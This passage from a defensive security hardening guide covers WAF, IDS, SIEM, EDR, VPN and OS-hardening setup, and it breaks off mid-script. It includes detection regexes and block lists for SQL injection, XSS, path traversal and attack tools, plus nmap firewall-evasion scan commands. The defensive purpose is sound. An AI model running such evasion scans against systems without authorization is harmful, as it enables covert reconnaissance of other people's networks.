# Monitor WAF logs
sudo tail -f /var/log/nginx/modsec_audit.log
```

#### Custom WAF Rules

```nginx
# Custom Nginx rate limiting + basic WAF
http {
    # Rate limiting zones
    limit_req_zone $binary_remote_addr zone=general:10m rate=10r/s;
    limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;
    limit_req_zone $binary_remote_addr zone=api:10m rate=30r/s;
    
    # Connection limiting
    limit_conn_zone $binary_remote_addr zone=conn_limit:10m;
    
    server {
        # Apply rate limits
        location / {
            limit_req zone=general burst=20 nodelay;
            limit_conn conn_limit 10;
        }
        
        location /api/auth/login {
            limit_req zone=login burst=3 nodelay;
            limit_req_status 429;
        }
        
        location /api/ {
            limit_req zone=api burst=50 nodelay;
        }
        
        # Block common malicious patterns
        if ($request_uri ~* "(union.*select|select.*from|insert.*into|drop.*table)") {
            return 444;  # Close connection without response
        }
        
        if ($request_uri ~* "(<script|javascript:|onerror=|onload=)") {
            return 444;
        }
        
        if ($request_uri ~* "(\.\.\/|\.\.\\|%2e%2e%2f|%252e)") {
            return 444;
        }
        
        # Block bad user agents
        if ($http_user_agent ~* "(nikto|sqlmap|masscan|nmap|hydra|medusa)") {
            return 444;
        }
        
        # Security headers
        add_header X-Frame-Options "SAMEORIGIN" always;
        add_header X-Content-Type-Options "nosniff" always;
        add_header Referrer-Policy "strict-origin-when-cross-origin" always;
        add_header Permissions-Policy "camera=(), microphone=(), geolocation=(), payment=()" always;
        add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self';" always;
        add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
    }
}
```

---

### 5.2 Intrusion Detection Systems (IDS/IPS)

#### Snort 3 Setup

```bash
# Install Snort 3 on Ubuntu
sudo apt update
sudo apt install -y build-essential libpcap-dev libpcre3-dev libdnet-dev zlib1g-dev

# Download and install from source
wget https://www.snort.org/downloads/snort/snort3-3.x.x.x.tar.gz
tar xzf snort3-*.tar.gz
cd snort3-*
./configure_cmake.sh --prefix=/usr/local
cd build
make -j$(nproc)
sudo make install

# Download community rules
sudo mkdir -p /etc/snort/rules
wget https://www.snort.org/downloads/community/community-rules.tar.gz
sudo tar xzf community-rules.tar.gz -C /etc/snort/rules/

# Basic Snort configuration
sudo tee /etc/snort/snort.lua << 'EOF'
-- snort.lua basic config
HOME_NET = '192.168.1.0/24'
EXTERNAL_NET = '!$HOME_NET'

include 'snort_defaults.lua'
include 'file_magic.lua'

ips =
{
    enable_builtin_rules = true,
    include = RULE_PATH .. '/community.rules',
    rules = [[
        alert tcp any any -> $HOME_NET 22 (msg:"SSH Brute Force Attempt"; flow:to_server; threshold:type threshold, track by_src, count 5, seconds 60; sid:100001; rev:1;)
        alert tcp any any -> $HOME_NET any (msg:"Potential Port Scan"; flags:S; threshold:type threshold, track by_src, count 20, seconds 5; sid:100002; rev:1;)
    ]],
}

alert_fast = { file = true, packet = false, limit = 10 }
EOF

# Run Snort in IDS mode
sudo snort -c /etc/snort/snort.lua -i eth0 -A alert_fast

# Run as service
sudo snort -c /etc/snort/snort.lua -i eth0 -D -l /var/log/snort/ -A alert_fast
```

#### Suricata Setup (Recommended — multithreaded)

```bash
# Install Suricata
sudo add-apt-repository ppa:oisf/suricata-stable
sudo apt update
sudo apt install suricata

# Update rules
sudo suricata-update
sudo suricata-update list-sources
sudo suricata-update enable-source et/open          # Emerging Threats
sudo suricata-update update                         # Download and apply

# Configure Suricata
sudo nano /etc/suricata/suricata.yaml
# Key settings:
# HOME_NET: "[192.168.0.0/16,10.0.0.0/8,172.16.0.0/12]"
# af-packet:
#   - interface: eth0
#     threads: 4

# Test configuration
sudo suricata -T -c /etc/suricata/suricata.yaml

# Start Suricata
sudo systemctl start suricata
sudo systemctl enable suricata

# Monitor alerts in real-time
sudo tail -f /var/log/suricata/fast.log
sudo tail -f /var/log/suricata/eve.json | python3 -m json.tool | grep "alert" -A5

# Custom rules
sudo tee /etc/suricata/rules/local.rules << 'EOF'
# Detect Nmap OS scan
alert tcp any any -> $HOME_NET any (msg:"Nmap OS Detection Scan"; flags:FPU; threshold: type threshold, track by_src, count 10, seconds 5; classtype:attempted-recon; sid:9000001; rev:1;)

# Detect SQL Injection attempts
alert http any any -> $HOME_NET any (msg:"SQL Injection Attempt"; content:"UNION"; nocase; content:"SELECT"; nocase; distance:0; within:20; classtype:web-application-attack; sid:9000002; rev:1;)

# Detect SSH password spraying
alert tcp any any -> $HOME_NET 22 (msg:"SSH Brute Force Detection"; flags:S; threshold:type both, track by_src, count 10, seconds 60; classtype:attempted-admin; sid:9000003; rev:1;)

# Detect crypto mining
alert dns any any -> any any (msg:"Crypto Mining Pool DNS Lookup"; content:"pool.supportxmr.com"; nocase; classtype:policy-violation; sid:9000004; rev:1;)
EOF
```

#### OSSEC / Wazuh (HIDS)

```bash
# Install Wazuh Manager
curl -sO https://packages.wazuh.com/4.x/wazuh-install.sh
sudo bash wazuh-install.sh -a    # All-in-one installation (manager + indexer + dashboard)

# Install Wazuh Agent on endpoints
# Download agent installer from https://packages.wazuh.com/
# Linux agent:
wget https://packages.wazuh.com/4.x/apt/pool/main/w/wazuh-agent/wazuh-agent_4.x.x-x_amd64.deb
sudo WAZUH_MANAGER='MANAGER_IP' dpkg -i ./wazuh-agent_4.x.x-x_amd64.deb
sudo systemctl start wazuh-agent

# Key Wazuh detection capabilities:
# - File Integrity Monitoring (FIM)
# - Log analysis and correlation
# - Rootkit detection
# - Active response (auto-block IPs)
# - Vulnerability detection
# - CIS benchmark assessment

# Custom Wazuh rules (in /var/ossec/etc/rules/local_rules.xml)
cat >> /var/ossec/etc/rules/local_rules.xml << 'EOF'
<group name="custom,">
  <!-- Alert on sudo commands -->
  <rule id="100001" level="6">
    <if_sid>5401</if_sid>
    <description>Sudo command executed</description>
  </rule>
  
  <!-- Alert on new user creation -->
  <rule id="100002" level="10">
    <if_sid>5902</if_sid>
    <description>New user account created on system</description>
  </rule>
</group>
EOF

sudo systemctl restart wazuh-manager
```

---

### 5.3 SIEM Setup

#### Elastic SIEM (ELK Stack)

```bash
# Docker Compose for ELK Stack
cat > docker-compose-elk.yml << 'EOF'
version: '3.8'
services:
  elasticsearch:
    image: docker.elastic.co/elasticsearch/elasticsearch:8.12.0
    environment:
      - discovery.type=single-node
      - xpack.security.enabled=true
      - ELASTIC_PASSWORD=changeme_strong_password
      - "ES_JAVA_OPTS=-Xms4g -Xmx4g"
    ulimits:
      memlock:
        soft: -1
        hard: -1
    volumes:
      - elasticsearch_data:/usr/share/elasticsearch/data
    ports:
      - "9200:9200"
  
  logstash:
    image: docker.elastic.co/logstash/logstash:8.12.0
    volumes:
      - ./logstash/pipeline:/usr/share/logstash/pipeline
      - ./logstash/config:/usr/share/logstash/config
    ports:
      - "5044:5044"
      - "5000:5000"
    environment:
      - ELASTICSEARCH_HOST=elasticsearch:9200
      - ELASTICSEARCH_USERNAME=elastic
      - ELASTICSEARCH_PASSWORD=changeme_strong_password
    depends_on:
      - elasticsearch
  
  kibana:
    image: docker.elastic.co/kibana/kibana:8.12.0
    environment:
      - ELASTICSEARCH_HOSTS=http://elasticsearch:9200
      - ELASTICSEARCH_USERNAME=elastic
      - ELASTICSEARCH_PASSWORD=changeme_strong_password
    ports:
      - "5601:5601"
    depends_on:
      - elasticsearch

volumes:
  elasticsearch_data:
EOF

docker compose -f docker-compose-elk.yml up -d

# Logstash pipeline for syslog
cat > logstash/pipeline/syslog.conf << 'EOF'
input {
  syslog {
    port => 5000
    type => "syslog"
  }
  beats {
    port => 5044
    type => "beats"
  }
}

filter {
  if [type] == "syslog" {
    grok {
      match => { "message" => "%{SYSLOGTIMESTAMP:syslog_timestamp} %{SYSLOGHOST:syslog_hostname} %{DATA:syslog_program}(?:\[%{POSINT:syslog_pid}\])?: %{GREEDYDATA:syslog_message}" }
    }
    date {
      match => [ "syslog_timestamp", "MMM  d HH:mm:ss", "MMM dd HH:mm:ss" ]
    }
    if [syslog_program] == "sshd" {
      grok {
        match => { "syslog_message" => "Failed password for %{USER:failed_user} from %{IP:src_ip}" }
        tag_on_failure => []
      }
    }
  }
}

output {
  elasticsearch {
    hosts => ["elasticsearch:9200"]
    user => "elastic"
    password => "changeme_strong_password"
    index => "logs-%{+YYYY.MM.dd}"
  }
}
EOF
```

---

### 5.4 Vulnerability Scanners

#### OpenVAS / Greenbone

```bash
# Install Greenbone Community Edition via Docker
cat > docker-compose-gvm.yml << 'EOF'
version: "3.8"
services:
  vulnerability-tests:
    image: greenbone/vulnerability-tests
    environment:
      STORAGE_PATH: /var/lib/openvas/22.04/vt-data/nasl
    volumes:
      - vt_data_vol:/mnt

  notus-data:
    image: greenbone/notus-data
    volumes:
      - notus_data_vol:/mnt

  scap-data:
    image: greenbone/scap-data
    volumes:
      - scap_data_vol:/mnt

  cert-bund-data:
    image: greenbone/cert-bund-data
    volumes:
      - cert_data_vol:/mnt

  dfn-cert-data:
    image: greenbone/dfn-cert-data
    volumes:
      - cert_data_vol:/mnt
    depends_on:
      - cert-bund-data

  data-objects:
    image: greenbone/data-objects
    volumes:
      - data_objects_vol:/mnt

  report-formats:
    image: greenbone/report-formats
    volumes:
      - data_objects_vol:/mnt
    depends_on:
      - data-objects

  gpg-data:
    image: greenbone/gpg-data
    volumes:
      - gpg_data_vol:/mnt

  redis-server:
    image: greenbone/redis-server
    volumes:
      - redis_socket_vol:/run/redis/

  pg-gvm:
    image: greenbone/pg-gvm:stable
    volumes:
      - psql_data_vol:/var/lib/postgresql

  gvmd:
    image: greenbone/gvmd:stable
    volumes:
      - gvmd_data_vol:/var/lib/gvm
      - scap_data_vol:/var/lib/gvm/scap-data/
      - cert_data_vol:/var/lib/gvm/cert-data
      - data_objects_vol:/var/lib/gvm/data-objects/gvmd
      - vt_data_vol:/var/lib/openvas/plugins
      - psql_data_vol:/var/lib/postgresql
      - gvmd_socket_vol:/run/gvmd
      - ospd_openvas_socket_vol:/run/ospd

  ospd-openvas:
    image: greenbone/ospd-openvas:stable
    cap_add:
      - NET_ADMIN
      - NET_RAW
    volumes:
      - gpg_data_vol:/etc/openvas/gnupg
      - vt_data_vol:/var/lib/openvas/plugins
      - notus_data_vol:/var/lib/notus
      - ospd_openvas_socket_vol:/run/ospd
      - redis_socket_vol:/run/redis/
    depends_on:
      redis-server:
        condition: service_started

  gsa:
    image: greenbone/gsa:stable
    ports:
      - 9392:80
    depends_on:
      - gvmd

volumes:
  gpg_data_vol:
  scap_data_vol:
  cert_data_vol:
  data_objects_vol:
  gvmd_data_vol:
  psql_data_vol:
  vt_data_vol:
  notus_data_vol:
  redis_socket_vol:
  ospd_openvas_socket_vol:
  gvmd_socket_vol:
EOF

docker compose -f docker-compose-gvm.yml up -d

# Access GSA at http://localhost:9392
# Default credentials: admin/admin (change immediately!)
```

#### Nmap Comprehensive Scanning

```bash
# Service and version detection
sudo nmap -sV -sC -O -A 192.168.1.0/24 -oA scan_results

# Vulnerability scan with NSE scripts
sudo nmap --script vuln 192.168.1.100
sudo nmap --script ssl-enum-ciphers -p 443 192.168.1.100    # SSL/TLS analysis
sudo nmap --script smb-vuln* -p 445 192.168.1.100            # SMB vulnerabilities
sudo nmap --script http-shellshock 192.168.1.100             # Shellshock check
sudo nmap --script ftp-anon 192.168.1.0/24 -p 21             # Anonymous FTP

# Firewall evasion techniques (authorized testing only)
sudo nmap -f 192.168.1.100                    # Fragment packets
sudo nmap --mtu 24 192.168.1.100             # Custom MTU
sudo nmap -D RND:10 192.168.1.100            # Decoy scan
sudo nmap -sI zombie_host 192.168.1.100      # Idle scan

# Output formats
sudo nmap -oN output.txt 192.168.1.0/24      # Normal
sudo nmap -oX output.xml 192.168.1.0/24      # XML
sudo nmap -oG output.gnmap 192.168.1.0/24    # Grepable
sudo nmap -oA all_formats 192.168.1.0/24     # All formats
```

---

### 5.5 Endpoint Detection & Response (EDR)

#### Velociraptor (Open Source EDR/DFIR)

```bash
# Download Velociraptor
wget https://github.com/Velocidex/velociraptor/releases/latest/download/velociraptor-v0.x.x-linux-amd64

# Generate configuration
./velociraptor config generate -i    # Interactive config generation

# Start server
./velociraptor --config server.config.yaml frontend -v

# Deploy client agent
./velociraptor --config client.config.yaml client -v

# Key VQL queries for threat hunting
# (Run in Velociraptor Web UI → Notebooks)

# Find executables in temp directories
SELECT FullPath, Size, Mtime, Hash.MD5
FROM glob(globs=["C:/Users/*/AppData/Local/Temp/*.exe", "/tmp/*.sh", "/var/tmp/*"])
WHERE IsLink == false

# Find persistence via scheduled tasks (Windows)
SELECT Name, Command, Arguments, ComObject
FROM scheduled_tasks()
WHERE Command != null

# Find running processes with network connections
SELECT Pid, Name, Exe, CommandLine, {
    SELECT * FROM connections() WHERE Pid = _value.Pid
} AS Connections
FROM pslist()

# Find recently modified files
SELECT FullPath, Mtime, Atime, Ctime, Size
FROM glob(globs=["C:/Windows/System32/**"])
WHERE Mtime > now() - 86400    # Modified in last 24 hours
```

---

### 5.6 Network Monitoring Tools

#### Zeek (Bro) Network Security Monitor

```bash
# Install Zeek
sudo apt install zeek

# Configure Zeek
sudo nano /etc/zeek/node.cfg
# [zeek]
# type=standalone
# host=localhost
# interface=eth0

sudo nano /etc/zeek/networks.cfg
# Add local networks:
# 192.168.0.0/16          Private network

# Start Zeek
sudo zeekctl deploy

# View Zeek logs
ls /var/log/zeek/current/
# conn.log    — All connections
# dns.log     — DNS queries
# http.log    — HTTP transactions
# ssl.log     — SSL/TLS handshakes
# files.log   — File transfers
# weird.log   — Unusual activity (important!)
# notice.log  — Alerts

# Query logs with zeek-cut
cat /var/log/zeek/current/conn.log | zeek-cut ts id.orig_h id.resp_h id.resp_p proto duration | head -20
cat /var/log/zeek/current/dns.log | zeek-cut ts id.orig_h query qtype_name | grep -v "^#"

# Detect port scans in conn.log
cat /var/log/zeek/current/conn.log | zeek-cut id.orig_h id.resp_h id.resp_p | \
    sort | uniq -c | sort -rn | \
    awk '$1 > 20 {print "Scanner: "$3" → scanned "$4":"$5, $1, "times"}'
```

#### ntopng Network Traffic Analyzer

```bash
# Install ntopng
sudo apt install ntopng

# Configure
sudo nano /etc/ntopng/ntopng.conf
# Add:
# -i=eth0
# -w=3000
# -d=/var/lib/ntopng

sudo systemctl start ntopng
# Access web UI at http://localhost:3000 (admin/admin — change!)
```

---

### 5.7 Password Managers & Secrets Management

#### Bitwarden Self-Hosted

```bash
# Bitwarden with Docker
curl -Lso bitwarden.sh "https://func.bitwarden.com/api/dl/?app=self-host&platform=linux"
chmod 700 bitwarden.sh
sudo ./bitwarden.sh install
sudo ./bitwarden.sh start

# Configure HTTPS (required)
sudo ./bitwarden.sh update ssl  

# Access at https://yourdomain.com
```

#### HashiCorp Vault — Secrets Management

```bash
# Install Vault
sudo apt install vault

# Development mode (not for production)
vault server -dev

# Production configuration
cat > /etc/vault.d/vault.hcl << 'EOF'
storage "raft" {
  path    = "/opt/vault/data"
  node_id = "node1"
}

listener "tcp" {
  address       = "0.0.0.0:8200"
  tls_cert_file = "/etc/vault.d/server.crt"
  tls_key_file  = "/etc/vault.d/server.key"
}

cluster_addr  = "https://127.0.0.1:8201"
api_addr      = "https://127.0.0.1:8200"
ui            = true
EOF

sudo systemctl start vault

# Initialize Vault
export VAULT_ADDR='https://127.0.0.1:8200'
vault operator init -key-shares=5 -key-threshold=3    # 5 keys, need 3 to unseal

# Unseal Vault (need 3 of 5 keys)
vault operator unseal <key1>
vault operator unseal <key2>
vault operator unseal <key3>

# Login
vault login <root_token>

# Enable secrets engine
vault secrets enable -path=secret kv-v2

# Store a secret
vault kv put secret/myapp/config db_password="supersecret" api_key="abc123"

# Retrieve a secret
vault kv get secret/myapp/config
vault kv get -field=db_password secret/myapp/config

# Dynamic database credentials (auto-rotating passwords)
vault secrets enable database
vault write database/config/my-postgresql \
    plugin_name=postgresql-database-plugin \
    allowed_roles="my-role" \
    connection_url="postgresql://{{username}}:{{password}}@localhost:5432/mydb" \
    username="vault" \
    password="vaultpassword"

vault write database/roles/my-role \
    db_name=my-postgresql \
    creation_statements="CREATE ROLE '{{name}}' WITH LOGIN PASSWORD '{{password}}' VALID UNTIL '{{expiration}}'; GRANT SELECT ON ALL TABLES IN SCHEMA public TO '{{name}}';" \
    default_ttl="1h" \
    max_ttl="24h"

# Get temporary DB credentials
vault read database/creds/my-role
```

---

### 5.8 VPN & Secure Tunneling

#### WireGuard Setup

```bash
# Install WireGuard
sudo apt install wireguard

# Generate server keys
wg genkey | sudo tee /etc/wireguard/server_private.key | wg pubkey | sudo tee /etc/wireguard/server_public.key
sudo chmod 600 /etc/wireguard/server_private.key

# Server configuration
SERVER_PRIVATE_KEY=$(sudo cat /etc/wireguard/server_private.key)
cat > /etc/wireguard/wg0.conf << EOF
[Interface]
Address = 10.0.0.1/24
ListenPort = 51820
PrivateKey = ${SERVER_PRIVATE_KEY}
PostUp = iptables -A FORWARD -i %i -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
PostDown = iptables -D FORWARD -i %i -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE

[Peer]
# Client 1
PublicKey = CLIENT_PUBLIC_KEY_HERE
AllowedIPs = 10.0.0.2/32
EOF

# Enable IP forwarding
echo "net.ipv4.ip_forward=1" | sudo tee -a /etc/sysctl.conf
sudo sysctl -p

# Start WireGuard
sudo systemctl enable --now wg-quick@wg0

# Client configuration
# wg genkey | tee client_private.key | wg pubkey > client_public.key
cat > client_wg0.conf << 'EOF'
[Interface]
Address = 10.0.0.2/24
PrivateKey = CLIENT_PRIVATE_KEY
DNS = 1.1.1.1

[Peer]
PublicKey = SERVER_PUBLIC_KEY
Endpoint = server_ip:51820
AllowedIPs = 0.0.0.0/0      # Route all traffic through VPN
PersistentKeepalive = 25
EOF
```

---

### 5.9 Threat Intelligence Platforms

#### MISP (Malware Information Sharing Platform)

```bash
# Install MISP via Docker
git clone https://github.com/MISP/misp-docker.git
cd misp-docker
cp template.env .env
# Edit .env: set BASE_URL, ADMIN_EMAIL, etc.
sudo docker compose up -d

# Access at https://localhost
# Default credentials: admin@admin.test / admin (change immediately!)

# Import threat feeds
# In MISP admin panel:
# → Sync Actions → Feeds → Load default MISP feeds
# → Enable CIRCL OSINT, abuse.ch URLhaus, etc.

# MISP API usage
curl -H "Authorization: YOUR_API_KEY" \
     -H "Accept: application/json" \
     https://misp.example.com/attributes/restSearch \
     --data '{"type":"ip-dst","value":"8.8.8.8"}'
```

---

## 6. OS Hardening Guides

### 6.1 Linux Server Hardening

```bash
#########################################
# SECTION 1: SSH HARDENING
#########################################
sudo nano /etc/ssh/sshd_config
```

```
# /etc/ssh/sshd_config — Hardened configuration
Port 2222                          # Change from default 22
Protocol 2
AddressFamily inet                 # IPv4 only (unless IPv6 needed)

# Authentication
PasswordAuthentication no          # Disable password auth — use keys ONLY
PubkeyAuthentication yes
AuthorizedKeysFile .ssh/authorized_keys
PermitRootLogin no                 # Never allow root login
PermitEmptyPasswords no
MaxAuthTries 3
MaxSessions 5
LoginGraceTime 30

# Allowed users/groups
AllowUsers alice bob               # Whitelist specific users
# AllowGroups sshusers             # Or whitelist groups

# Disable unnecessary features
X11Forwarding no
AllowTcpForwarding no
AllowAgentForwarding no
GatewayPorts no
PermitTunnel no

# Cryptography hardening
HostKey /etc/ssh/ssh_host_ed25519_key
HostKey /etc/ssh/ssh_host_rsa_key
KexAlgorithms curve25519-sha256,curve25519-sha256@libssh.org,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512
Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com
MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com
HostKeyAlgorithms ssh-ed25519,rsa-sha2-512,rsa-sha2-256

# Connection keepalive
ClientAliveInterval 300
ClientAliveCountMax 2

# Banner
Banner /etc/ssh/banner.txt
```

```bash
sudo systemctl restart sshd

# Generate strong SSH key pair (Ed25519)
ssh-keygen -t ed25519 -C "user@hostname-$(date +%Y%m%d)" -f ~/.ssh/id_ed25519

# Delete weak host keys if they exist
sudo rm /etc/ssh/ssh_host_dsa_key* /etc/ssh/ssh_host_ecdsa_key* 2>/dev/null
sudo ssh-keygen -t ed25519 -f /etc/ssh/ssh_host_ed25519_key < /dev/null

#########################################
# SECTION 2: FIREWALL (nftables)
#########################################
sudo apt install nftables
sudo systemctl enable nftables

sudo tee /etc/nftables.conf << 'EOF'
#!/usr/sbin/nft -f
flush ruleset

table inet filter {
    chain input {
        type filter hook input priority 0; policy drop;
        
        # Allow established/related connections
        ct state established,related accept
        
        # Allow loopback
        iifname "lo" accept
        
        # Drop invalid packets
        ct state invalid drop
        
        # ICMP - allow ping with rate limit
        ip protocol icmp icmp type { echo-request } limit rate 10/second accept
        ip6 nexthdr icmpv6 icmpv6 type { echo-request } limit rate 10/second accept
        
        # SSH on custom port
        tcp dport 2222 limit rate 10/minute burst 5 packets accept
        
        # HTTP/HTTPS
        tcp dport { 80, 443 } accept
        
        # Log dropped packets
        limit rate 5/second log prefix "nft DROP: " drop
    }
    
    chain forward {
        type filter hook forward priority 0; policy drop;
    }
    
    chain output {
        type filter hook output priority 0; policy accept;
        # Optionally restrict outbound too
    }
}
EOF

sudo nft -f /etc/nftables.conf
sudo nft list ruleset

#########################################
# SECTION 3: KERNEL HARDENING (sysctl)
#########################################
sudo tee /etc/sysctl.d/99-hardening.conf << 'EOF'
# Network security
net.ipv4.ip_forward = 0                          # Disable IP forwarding (unless router)
net.ipv4.conf.all.send_redirects = 0             # Don't send ICMP redirects
net.ipv4.conf.default.send_redirects = 0
net.ipv4.conf.all.accept_redirects = 0           # Don't accept ICMP redirects
net.ipv4.conf.default.accept_redirects = 0
net.ipv4.conf.all.secure_redirects = 0
net.ipv6.conf.all.accept_redirects = 0
net.ipv4.conf.all.accept_source_route = 0        # No source routing
net.ipv6.conf.all.accept_source_route = 0
net.ipv4.conf.all.log_martians = 1               # Log packets with impossible addresses
net.ipv4.conf.default.log_martians = 1
net.ipv4.icmp_echo_ignore_broadcasts = 1         # Ignore broadcast pings (Smurf mitigation)
net.ipv4.icmp_ignore_bogus_error_responses = 1
net.ipv4.tcp_syncookies = 1                      # SYN flood protection
net.ipv4.tcp_rfc1337 = 1                         # Protect against TIME-WAIT assassination
net.ipv4.conf.all.rp_filter = 1                  # Reverse path filtering
net.ipv4.conf.default.rp_filter = 1
net.ipv6.conf.all.accept_ra = 0                  # Don't accept IPv6 router advertisements
net.ipv6.conf.default.accept_ra = 0

# Kernel hardening
kernel.randomize_va_space = 2                    # Full ASLR
kernel.dmesg_restrict = 1                        # Restrict dmesg to root
kernel.kptr_restrict = 2                         # Hide kernel pointers
kernel.sysrq = 0                                 # Disable SysRq key
kernel.core_uses_pid = 1                         # PID in core dump filename
kernel.panic = 10                                # Reboot after 10s on panic
kernel.perf_event_paranoid = 3                   # Restrict perf events

# File system
fs.suid_dumpable = 0                             # No core dumps for SUID programs
fs.protected_fifos = 2                           # Prevent FIFO hijacking
fs.protected_regular = 2                         # Prevent regular file hijacking
fs.protected_symlinks = 1                        # Prevent symlink attacks
fs.protected_hardlinks = 1                       # Prevent hardlink attacks
EOF

sudo sysctl -p /etc/sysctl.d/99-hardening.conf

#########################################
# SECTION 4: FILE SYSTEM HARDENING
#########################################
# Secure /tmp with tmpfs
sudo tee -a /etc/fstab << 'EOF'
tmpfs   /tmp         tmpfs   defaults,rw,nosuid,nodev,noexec,size=2G   0 0
tmpfs   /var/tmp     tmpfs   defaults,rw,nosuid,nodev,noexec,size=2G   0 0
tmpfs   /dev/shm     tmpfs   defaults,rw,nosuid,nodev,noexec           0 0
EOF

sudo mount -o remount /tmp
sudo mount -o remount /var/tmp

# Find and audit SUID/SGID files
echo "=== SUID Files ===" 
sudo find / -perm -4000 -type f 2>/dev/null | sort
echo "=== SGID Files ===" 
sudo find / -perm -2000 -type f 2>/dev/null | sort

# Remove unnecessary SUID bits
sudo chmod u-s /usr/bin/newgrp
# sudo chmod u-s /bin/su  # Careful — may break su

#########################################
# SECTION 5: PAM HARDENING
#########################################
# Password policy
sudo tee /etc/security/pwquality.conf << 'EOF'
minlen = 14
minclass = 4
maxrepeat = 3
maxsequence = 4
gecoscheck = 1
EOF

# Account lockout (edit /etc/pam.d/common-auth on Debian/Ubuntu)
# Add before pam_unix.so:
# auth    required      pam_faillock.so preauth audit deny=5 unlock_time=900
# After pam_unix.so:
# auth    [default=die] pam_faillock.so authfail deny=5 unlock_time=900
# auth    sufficient    pam_faillock.so authsucc deny=5 unlock_time=900

#########################################
# SECTION 6: AUDITD — AUDIT LOGGING
#########################################
sudo apt install auditd audispd-plugins

# Comprehensive audit rules
sudo tee /etc/audit/rules.d/hardening.rules << 'EOF'
## Delete existing rules
-D

## Buffer size
-b 8192

## Failure mode (1=log, 2=panic)
-f 1

## Watch for changes to authentication files
-w /etc/passwd -p wa -k identity
-w /etc/group -p wa -k identity
-w /etc/shadow -p wa -k identity
-w /etc/sudoers -p wa -k sudoers
-w /etc/sudoers.d/ -p wa -k sudoers

## SSH configuration changes
-w /etc/ssh/sshd_config -p wa -k sshd_config

## Kernel module loading
-w /sbin/insmod -p x -k modules
-w /sbin/rmmod -p x -k modules
-w /sbin/modprobe -p x -k modules
-a always,exit -F arch=b64 -S init_module,delete_module -k modules

## System calls to monitor
-a always,exit -F arch=b64 -S execve -k exec
-a always,exit -F arch=b64 -S open,openat -F exit=-EACCES -k access_denied
-a always,exit -F arch=b64 -S ptrace -k ptrace

## File system mounts
-a always,exit -F arch=b64 -S mount -k mounts

## Network configuration changes
-w /etc/hosts -p wa -k hosts
-w /etc/network/ -p wa -k network
-w /etc/sysconfig/network -p wa -k network

## Cron and scheduled tasks
-w /etc/cron.d/ -p wa -k cron
-w /etc/cron.daily/ -p wa -k cron
-w /var/spool/cron/ -p wa -k cron

## Make rules immutable (reboot required to change)
-e 2
EOF

sudo service auditd restart

# Query audit logs
sudo ausearch -k sudoers                        # Sudoers changes
sudo ausearch -k exec --start today             # Commands executed today
sudo ausearch -m LOGIN --start today            # Login events
sudo aureport --failed                          # Failed events summary
sudo aureport --auth --summary                  # Authentication summary
```

---

### 6.2 Windows Server Hardening

```powershell
# Enable Windows Defender features
Set-MpPreference -DisableRealtimeMonitoring $false
Set-MpPreference -EnableNetworkProtection Enabled
Set-MpPreference -EnableControlledFolderAccess Enabled
Set-MpPreference -PUAProtection Enabled
Set-MpPreference -CloudBlockLevel High
Set-MpPreference -CloudExtendedTimeout 50

# Enable Attack Surface Reduction rules
$ASRRules = @{
    "BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550" = 1  # Block executable content from email
    "D4F940AB-401B-4EFC-AADC-AD5F3C50688A" = 1  # Block Office from creating child processes
    "3B576869-A4EC-4529-8536-B80A7769E899" = 1  # Block Office from creating executable content
    "75668C1F-73B5-4CF0-BB93-3ECF5CB7CC84" = 1  # Block Office from injecting code into other processes
    "D3E037E1-3EB8-44C8-A917-57927947596D" = 1  # Block JavaScript or VBScript from launching downloads
    "5BEB7EFE-FD9A-4556-801D-275E5FFC04CC" = 1  # Block execution of potentially obfuscated scripts
    "92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B" = 1  # Block Win32 imports from Macro code
    "01443614-CD74-433A-B99E-2ECDC07BFC25" = 1  # Block executable files from running unless meet criteria
    "C1DB55AB-C21A-4637-BB3F-A12568109D35" = 1  # Use advanced protection against ransomware
    "9E6C4E1F-7D60-472F-BA1A-A39EF669E4B2" = 1  # Block credential stealing from LSASS
    "D1E49AAC-8F56-4280-B9BA-993A6D77406C" = 1  # Block process creations originating from PSExec and WMI
    "B2B3F03D-6A65-4F7B-A9C7-1C7EF74A9BA4" = 1  # Block untrusted and unsigned processes from USB
    "26190899-1602-49E8-8B27-EB1D0A1CE869" = 1  # Block Office communication from creating child processes
    "7674BA52-37EB-4A4F-A9A1-F0F9A1619A2C" = 1  # Block Adobe Reader from creating child processes
    "E6DB77E5-3DF2-4CF1-B95A-636979351E5B" = 1  # Block persistence through WMI event subscription
}

foreach ($rule in $ASRRules.GetEnumerator()) {
    Add-MpPreference -AttackSurfaceReductionRules_Ids $rule.Key -AttackSurfaceReductionRules_Actions $rule.Value
}

# Disable legacy protocols
Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force    # Disable SMBv1
Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol

# Disable NTLM (prefer Kerberos)
# Group Policy: Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options
# "Network security: LAN Manager authentication level" → "Send NTLMv2 response only, refuse LM & NTLM"

# PowerShell script execution policy
Set-ExecutionPolicy AllSigned -Scope LocalMachine -Force    # Only signed scripts

# Audit policy
auditpol /set /category:"Account Logon" /success:enable /failure:enable
auditpol /set /category:"Logon/Logoff" /success:enable /failure:enable
auditpol /set /category:"Object Access" /success:enable /failure:enable
auditpol /set /category:"Policy Change" /success:enable /failure:enable
auditpol /set /category:"Privilege Use" /success:enable /failure:enable
auditpol /set /category:"System" /success:enable /failure:enable
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable

# Windows Firewall hardening
netsh advfirewall set allprofiles state on
netsh advfirewall set allprofiles firewallpolicy blockinbound,allowoutbound
netsh advfirewall set allprofiles settings remotemanagement disable
netsh advfirewall set allprofiles settings inboundusernotification enable

# Disable unnecessary services
$ServicesToDisable = @(
    "Fax",
    "XblAuthManager",
    "XblGameSave",
    "XboxNetApiSvc",
    "WerSvc",        # Windows Error Reporting
    "RemoteRegistry",
    "Spooler"        # Print Spooler — if not needed
)
foreach ($svc in $ServicesToDisable) {
